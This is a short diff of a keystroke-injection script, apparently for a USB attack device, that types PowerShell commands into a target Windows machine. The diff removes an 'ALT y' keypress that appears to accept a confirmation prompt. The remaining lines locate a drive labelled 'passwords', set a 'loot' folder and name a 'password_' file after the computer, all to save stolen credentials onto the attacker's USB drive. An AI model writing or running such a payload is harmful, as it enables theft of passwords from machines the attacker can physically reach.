@@ -23,8 +23,6 @@ press("SHIFT TAB");
 delay(100);
 press("ENTER");
 delay(500);
-press("ALT y");
-delay(500);
 type("$dest = ((Get-WmiObject win32_volume -f 'label=''passwords''').Name+'\\loot\\')\n")
 delay(200);
 type("$filter = 'password_'+ $env:COMPUTERNAME; $filecount = ((Get-ChildItem -filter ($filter + \"*\") -path $dest | Measure-Object | Select -ExpandProperty Count) + 1)\n")
